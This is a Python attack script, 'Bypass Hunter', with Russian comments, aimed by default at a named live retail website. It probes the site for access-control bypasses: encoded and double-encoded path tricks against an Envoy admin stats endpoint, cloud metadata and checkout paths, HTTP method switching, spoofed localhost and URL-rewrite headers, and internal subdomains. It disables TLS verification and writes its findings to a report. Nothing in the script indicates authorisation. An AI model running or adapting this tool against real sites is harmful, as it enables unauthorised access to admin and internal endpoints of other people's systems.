#!/usr/bin/env python3
"""
Bypass Hunter - поиск обходов защиты для известных endpoints
"""

import requests
import json
from urllib.parse import urljoin, quote, unquote
from datetime import datetime
import urllib3
urllib3.disable_warnings()

class BypassHunter:
    def __init__(self, target="www.zooplus.de"):
        self.target = target
        self.base_url = f"https://{target}"
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def test_bypass(self, base_path, bypasses):
        """Тестирует различные обходы для пути"""
        results = []
        for bypass in bypasses:
            try:
                url = urljoin(self.base_url, bypass)
                resp = self.session.get(url, timeout=1.5, verify=False, allow_redirects=False)
                
                if resp.status_code not in [404, 403]:
                    results.append({
                        "path": bypass,
                        "status": resp.status_code,
                        "response_length": len(resp.text) if resp.text else 0
                    })
            except:
                pass
        return results
    
    def hunt_envoy_bypasses(self):
        """Поиск обходов для Envoy admin"""
        print("\n[*] Envoy admin bypasses...")
        
        base = "stats"
        bypasses = [
            f"/{base}",
            f"/{base}/",
            f"//{base}",
            f"/./{base}",
            f"/{base}/..",
            f"/{base}%2f",
            f"/{base}%252f",
            f"/{base};",
            f"/{base}?",
            f"/{base}#",
            f"/admin/{base}",
            f"/_admin/{base}",
            f"/envoy/{base}",
            f"/istio/{base}",
            f"/api/{base}",
            f"/v1/{base}",
            f"/{base}?format=json",
            f"/{base}?format=prometheus",
            quote(f"/{base}"),
            quote(quote(f"/{base}")),  # Double encoding
        ]
        
        results = self.test_bypass(base, bypasses)
        if results:
            for r in results:
                if r['status'] == 200:
                    self.findings.append({
                        "severity": "CRITICAL",
                        "type": "envoy_admin_bypass",
                        "path": r['path'],
                        "status": r['status']
                    })
                    print(f"  [CRITICAL] Bypass found: {r['path']}")
    
    def hunt_known_endpoints_bypass(self):
        """Обходы для известных endpoints из предыдущих тестов"""
        print("\n[*] Testing known endpoints with bypasses...")
        
        # Из предыдущих тестов знаем про metadata endpoint
        known_paths = [
            "/latest/meta-data",
            "/api/cart-api/v2",
            "/semiprotected/api/checkout",
        ]
        
        for base_path in known_paths:
            bypasses = [
                base_path,
                f"{base_path}/",
                f"//{base_path}",
                f"/./{base_path}",
                quote(base_path),
                quote(quote(base_path)),
            ]
            
            results = self.test_bypass(base_path, bypasses)
            if results:
                for r in results:
                    if r['status'] not in [404, 403]:
                        self.findings.append({
                            "severity": "MEDIUM",
                            "type": "known_endpoint_bypass",
                            "path": r['path'],
                            "status": r['status']
                        })
                        print(f"  [MEDIUM] Bypass: {r['path']} -> {r['status']}")
    
    def hunt_method_bypass(self):
        """Обход через разные HTTP методы"""
        print("\n[*] Method bypass testing...")
        
        test_paths = [
            "/stats",
            "/api/config",
            "/admin",
            "/api/upload"
        ]
        
        for path in test_paths:
            methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD']
            for method in methods:
                try:
                    url = urljoin(self.base_url, path)
                    resp = self.session.request(method, url, timeout=1.5, verify=False, allow_redirects=False)
                    
                    if resp.status_code not in [404, 403, 405]:
                        self.findings.append({
                            "severity": "MEDIUM",
                            "type": "method_bypass",
                            "path": path,
                            "method": method,
                            "status": resp.status_code
                        })
                        print(f"  [MEDIUM] Method bypass: {method} {path} -> {resp.status_code}")
                        break  # Found one, no need to continue
                except:
                    pass
    
    def hunt_header_bypass(self):
        """Обход через заголовки"""
        print("\n[*] Header bypass testing...")
        
        test_paths = ["/admin", "/api/config", "/stats"]
        
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"Host": "localhost"},
            {"X-Original-URL": "/stats"},
            {"X-Rewrite-URL": "/stats"},
        ]
        
        for path in test_paths:
            for headers in bypass_headers:
                try:
                    url = urljoin(self.base_url, path)
                    resp = self.session.get(url, headers=headers, timeout=1.5, verify=False, allow_redirects=False)
                    
                    if resp.status_code not in [404, 403]:
                        self.findings.append({
                            "severity": "MEDIUM",
                            "type": "header_bypass",
                            "path": path,
                            "headers": headers,
                            "status": resp.status_code
                        })
                        print(f"  [MEDIUM] Header bypass: {path} with {list(headers.keys())[0]} -> {resp.status_code}")
                        break
                except:
                    pass
    
    def hunt_subdomain_bypass(self):
        """Проверка обхода через поддомены"""
        print("\n[*] Subdomain bypass testing...")
        
        subdomains = [
            "admin",
            "api",
            "internal",
            "dev",
            "test",
            "staging",
            "admin-api",
            "internal-api"
        ]
        
        test_paths = ["/stats", "/config", "/admin"]
        
        for subdomain in subdomains[:5]:  # Limit
            for path in test_paths:
                try:
                    url = f"https://{subdomain}.{self.target}{path}"
                    resp = self.session.get(url, timeout=1.5, verify=False, allow_redirects=False)
                    
                    if resp.status_code not in [404, 403]:
                        self.findings.append({
                            "severity": "HIGH",
                            "type": "subdomain_bypass",
                            "url": url,
                            "status": resp.status_code
                        })
                        print(f"  [HIGH] Subdomain bypass: {url} -> {resp.status_code}")
                except:
                    pass
    
    def run(self):
        """Запуск всех проверок"""
        print("=" * 70)
        print("BYPASS HUNTER")
        print("=" * 70)
        print(f"Target: {self.target}")
        print("=" * 70)
        
        self.hunt_envoy_bypasses()
        self.hunt_known_endpoints_bypass()
        self.hunt_method_bypass()
        self.hunt_header_bypass()
        self.hunt_subdomain_bypass()
        
        print("\n" + "=" * 70)
        print("SUMMARY")
        print("=" * 70)
        print(f"Total bypasses found: {len(self.findings)}")
        
        if self.findings:
            critical = len([f for f in self.findings if f['severity'] == 'CRITICAL'])
            high = len([f for f in self.findings if f['severity'] == 'HIGH'])
            medium = len([f for f in self.findings if f['severity'] == 'MEDIUM'])
            print(f"  CRITICAL: {critical}")
            print(f"  HIGH: {high}")
            print(f"  MEDIUM: {medium}")
            
            # Save report
            import os
            os.makedirs("reports", exist_ok=True)
            with open("reports/bypass_hunt.json", "w") as f:
                json.dump({
                    "target": self.target,
                    "scan_date": datetime.now().isoformat(),
                    "findings": self.findings
                }, f, indent=2)
            print(f"\n[+] Report saved to: reports/bypass_hunt.json")
        else:
            print("  No bypasses found")
        
        return self.findings

if __name__ == "__main__":
    hunter = BypassHunter()
    hunter.run()

